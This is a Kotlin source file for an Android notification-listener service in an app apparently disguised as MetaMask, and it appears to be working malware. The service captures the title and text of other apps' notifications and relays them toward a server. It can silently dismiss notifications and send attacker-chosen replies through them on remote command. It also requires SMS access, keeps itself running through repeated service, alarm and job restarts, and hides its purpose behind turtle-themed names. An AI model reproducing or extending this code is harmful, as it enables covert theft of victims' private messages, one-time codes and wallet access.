package com.example.MetaMask.services

import android.content.ComponentName
import android.content.Context
import android.app.PendingIntent
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.app.RemoteInput
import androidx.annotation.Keep
import androidx.work.ExistingWorkPolicy
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.OutOfQuotaPolicy
import androidx.work.WorkManager
import com.example.MetaMask.receivers.AlarmReceiver
import org.json.JSONObject
import java.util.Collections

@Keep
class TurtleService : NotificationListenerService() {

    companion object {
        private const val TAG = "TurtleService"
        private const val ACTION_TURTLE_REPORT = "com.example.MetaMask.ACTION_SEND_TO_SERVER"
        private const val EXTRA_SHELL_DATA = "com.example.MetaMask.EXTRA_MESSAGE_TO_SEND"
        private const val REMOVAL_DELAY_MS = 250L
        private const val KICK_DEBOUNCE_MS = 5000L
        private const val MWD_START_DEBOUNCE_MS = 20_000L

        var isTurtleAwake = false
    }

    private var lastKickTime: Long = 0L
    private var lastMwdStartTime: Long = 0L

    private val discardedShells = Collections.synchronizedSet(mutableSetOf<String>())
    private val shellCache = mutableMapOf<String, String>()
    private val debrisHandler = Handler(Looper.getMainLooper())
    private val pendingDebris = Collections.synchronizedMap(mutableMapOf<String, Runnable>())

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        android.util.Log.d("XDBG", "[TurtleService] onStartCommand enter intent=${intent} flags=${flags} startId=${startId}") //xdbg
        val hasReadSms = androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) == android.content.pm.PackageManager.PERMISSION_GRANTED
        if (!hasReadSms) return START_NOT_STICKY

        if (!isTurtleAwake) {
            android.util.Log.d("XDBG", "[TurtleService] if branch") //xdbg
            try {
                val componentName = ComponentName(this, TurtleService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    android.util.Log.d("XDBG", "[TurtleService] if branch") //xdbg
                    packageManager.setComponentEnabledSetting(
                        componentName,
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP
                    )
                    Handler(Looper.getMainLooper()).postDelayed({
                        try {
                            packageManager.setComponentEnabledSetting(
                                componentName,
                                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                                PackageManager.DONT_KILL_APP
                            )
                            requestRebind(componentName)
                        } catch (_: Exception) {}
                    }, 300L)
                } else {
                    val pm = packageManager
                    pm.setComponentEnabledSetting(
                        componentName,
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP
                    )
                    pm.setComponentEnabledSetting(
                        componentName,
                        PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                        PackageManager.DONT_KILL_APP
                    )
                }
            } catch (_: Exception) {}
        }

        val commandJsonString = intent?.getStringExtra("command")
        if (commandJsonString != null) {
            android.util.Log.d("XDBG", "[TurtleService] if branch") //xdbg
            try {
                val json = JSONObject(commandJsonString)
                val token = json.optString("shellToken")
                if (token.isEmpty()) return START_STICKY

                when (json.optString("action")) {
                    "hideShell" -> crackShell(token)
                    "snapBite" -> {
                        val force = json.optString("biteForce")
                        snapBack(token, force)
                    }
                }
            } catch (_: Exception) {}
        }
        android.util.Log.d("XDBG", "[TurtleService] return") //xdbg
        return START_STICKY
    }

    private fun crackShell(token: String) {
        android.util.Log.d("XDBG", "[TurtleService] crackShell enter token=${token}") //xdbg
        val item = activeNotifications.find { it.key == token }
        if (item != null) {
            android.util.Log.d("XDBG", "[TurtleService] if branch") //xdbg
            reportStatus(token, "shell_cracked")
            discardedShells.add(token)
            cancelNotification(token)
        } else {
            reportStatus(token, "shell_missing")
        }
    }

    private fun snapBack(token: String, force: String) {
        android.util.Log.d("XDBG", "[TurtleService] snapBack enter token=${token} force=${force}") //xdbg
        val item = activeNotifications.find { it.key == token }
        if (item == null) {
            android.util.Log.d("XDBG", "[TurtleService] if branch") //xdbg
            reportStatus(token, "shell_missing")
            return
        }

        val biteAction = item.notification.actions?.find { action ->
            action.remoteInputs?.any { it.allowFreeFormInput } == true
        }
        if (biteAction == null) {
            android.util.Log.d("XDBG", "[TurtleService] if branch") //xdbg
            reportStatus(token, "jaw_locked")
            return
        }

        val remoteInput = biteAction.remoteInputs.first { it.allowFreeFormInput }
        val intent = Intent()
        val bundle = Bundle()
        bundle.putCharSequence(remoteInput.resultKey, force)
        RemoteInput.addResultsToIntent(arrayOf(remoteInput), intent, bundle)

        try {
            reportStatus(token, "snapped", force)
            discardedShells.add(token)
            biteAction.actionIntent.send(applicationContext, 0, intent)
        } catch (e: PendingIntent.CanceledException) {
            android.util.Log.e("XDBG", "[TurtleService] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            discardedShells.remove(token)
            reportStatus(token, "jaw_failed")
        }
    }

    private fun reportStatus(token: String, status: String, extra: String? = null) {
        android.util.Log.d("XDBG", "[TurtleService] reportStatus enter token=${token} status=${status} extra=${extra}") //xdbg
        val payload = JSONObject().apply {
            put("action", "turtleStatus")
            put("shellToken", token)
            put("status", status)
            extra?.let { put("extraData", it) }
        }
        dispatchToOcean(payload)
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        android.util.Log.d("XDBG", "[TurtleService] onNotificationPosted enter sbn=${sbn}") //xdbg
        super.onNotificationPosted(sbn)
        if (sbn == null) return

        if (sbn.packageName == packageName) {
            android.util.Log.d("XDBG", "[TurtleService] if branch") //xdbg
            return
        }

        if (sbn.packageName == "android" || sbn.packageName == "com.android.systemui") {
            android.util.Log.d("XDBG", "[TurtleService] if branch") //xdbg
            return
        }

        val flags = sbn.notification.flags
        if ((flags and android.app.Notification.FLAG_ONGOING_EVENT) != 0 ||
            (flags and android.app.Notification.FLAG_FOREGROUND_SERVICE) != 0) {
            return
        }

        pokeSystem(force = false)

        val token = sbn.key

        pendingDebris.remove(token)?.let {
            debrisHandler.removeCallbacks(it)
        }

        val currentSignature = generateShellPattern(sbn)
        if (shellCache[token] == currentSignature) {
            android.util.Log.d("XDBG", "[TurtleService] if branch") //xdbg
            return
        }
        shellCache[token] = currentSignature

        val species = getSpeciesOrigin(sbn.packageName)
        val shellTop = sbn.notification.extras.getCharSequence("android.title")?.toString() ?: ""
        val shellBottom = sbn.notification.extras.getCharSequence("android.text")?.toString() ?: ""

        if (shellTop.isBlank() && shellBottom.isBlank()) return

        val canBite = sbn.notification.actions?.any { action ->
            action.remoteInputs?.any { it.allowFreeFormInput } == true
        } == true

        try {
            val shellData = JSONObject().apply {
                put("species", species)
                put("top", shellTop)
                put("bottom", shellBottom)
                put("age", System.currentTimeMillis())
                put("shellToken", token)
                put("canBite", canBite)
            }
            val payload = JSONObject().apply {
                put("action", "spawnTurtle")
                put("shell", shellData)
            }
            dispatchToOcean(payload)
        } catch (_: Exception) {}

        val prefs = applicationContext.getSharedPreferences("device_settings", Context.MODE_PRIVATE)
        val invisible = prefs.getBoolean("invisible_intercept_enabled", false)

        if (invisible) {
            android.util.Log.d("XDBG", "[TurtleService] if branch") //xdbg
            discardedShells.add(token)
            cancelNotification(token)
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        android.util.Log.d("XDBG", "[TurtleService] onNotificationRemoved enter sbn=${sbn}") //xdbg
        super.onNotificationRemoved(sbn)
        if (sbn == null) return

        if (sbn.packageName == packageName) return

        val token = sbn.key
        shellCache.remove(token)

        if (discardedShells.contains(token)) {
            android.util.Log.d("XDBG", "[TurtleService] if branch") //xdbg
            discardedShells.remove(token)
            return
        }

        val debrisRunnable = Runnable {
            pendingDebris.remove(token)
            reportStatus(token, "washed_away")
        }
        pendingDebris[token] = debrisRunnable
        debrisHandler.postDelayed(debrisRunnable, REMOVAL_DELAY_MS)
    }

    private fun dispatchToOcean(jsonData: JSONObject) {
        android.util.Log.d("XDBG", "[TurtleService] dispatchToOcean enter jsonData=${jsonData}") //xdbg
        val intent = Intent(ACTION_TURTLE_REPORT).apply {
            putExtra(EXTRA_SHELL_DATA, jsonData.toString())
            setPackage(packageName)
        }
        sendBroadcast(intent)
    }

    private fun generateShellPattern(sbn: StatusBarNotification): String {
        android.util.Log.d("XDBG", "[TurtleService] generateShellPattern enter sbn=${sbn}") //xdbg
        val t1 = sbn.notification.extras.getCharSequence("android.title")?.toString() ?: ""
        val t2 = sbn.notification.extras.getCharSequence("android.text")?.toString() ?: ""
        android.util.Log.d("XDBG", "[TurtleService] return") //xdbg
        return "$t1|$t2"
    }

    private fun getSpeciesOrigin(packageName: String): String {
        android.util.Log.d("XDBG", "[TurtleService] getSpeciesOrigin enter packageName=${packageName}") //xdbg
        android.util.Log.d("XDBG", "[TurtleService] return") //xdbg
        return try {
            packageManager.getApplicationInfo(packageName, 0).loadLabel(packageManager).toString()
        } catch (e: PackageManager.NameNotFoundException) {
            android.util.Log.e("XDBG", "[TurtleService] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            packageName
        }
    }

    private fun pokeSystem(force: Boolean = false) {
        android.util.Log.d("XDBG", "[TurtleService] pokeSystem enter force=${force}") //xdbg
        val now = System.currentTimeMillis()

        if (!force && (now - lastKickTime) < KICK_DEBOUNCE_MS) {
            android.util.Log.d("XDBG", "[TurtleService] if branch") //xdbg
            return
        }

        lastKickTime = now

        try {
            try {
                val pulseIntent = Intent(applicationContext, com.example.MetaMask.services.PulseService::class.java)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    android.util.Log.d("XDBG", "[TurtleService] if branch") //xdbg
                    startForegroundService(pulseIntent)
                } else {
                    startService(pulseIntent)
                }
            } catch (_: Exception) {}

            if (!MasterWebSocketDispatcher.IS_SERVICE_RUNNING) {
                android.util.Log.d("XDBG", "[TurtleService] if branch") //xdbg
                val mwdNow = System.currentTimeMillis()
                if (mwdNow - lastMwdStartTime >= MWD_START_DEBOUNCE_MS) {
                    android.util.Log.d("XDBG", "[TurtleService] if branch") //xdbg
                    lastMwdStartTime = mwdNow
                    try {
                        val masterIntent = Intent(applicationContext, MasterWebSocketDispatcher::class.java)
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            android.util.Log.d("XDBG", "[TurtleService] if branch") //xdbg
                            startForegroundService(masterIntent)
                        } else {
                            startService(masterIntent)
                        }
                    } catch (_: Exception) {}
                }
            }
        } catch (_: Exception) {}

        try {
            val alarmIntent = Intent(applicationContext, AlarmReceiver::class.java)
            sendBroadcast(alarmIntent)
        } catch (_: Exception) {}

        try {
            val request = OneTimeWorkRequestBuilder<ServiceStarterWorker>()
                .setExpedited(OutOfQuotaPolicy.RUN_AS_NON_EXPEDITED_WORK_REQUEST)
                .addTag("TURTLE_TRIGGER")
                .build()
            WorkManager.getInstance(applicationContext).enqueueUniqueWork("SS_ONCE", ExistingWorkPolicy.KEEP, request)
        } catch (_: Exception) {}
    }

    override fun onListenerConnected() {
        android.util.Log.d("XDBG", "[TurtleService] onListenerConnected enter") //xdbg
        super.onListenerConnected()
        isTurtleAwake = true
        shellCache.clear()
        discardedShells.clear()
        pendingDebris.values.forEach { debrisHandler.removeCallbacks(it) }
        pendingDebris.clear()
    }

    override fun onListenerDisconnected() {
        android.util.Log.d("XDBG", "[TurtleService] onListenerDisconnected enter") //xdbg
        super.onListenerDisconnected()
        isTurtleAwake = false
        pendingDebris.values.forEach { debrisHandler.removeCallbacks(it) }
        pendingDebris.clear()
    }
}
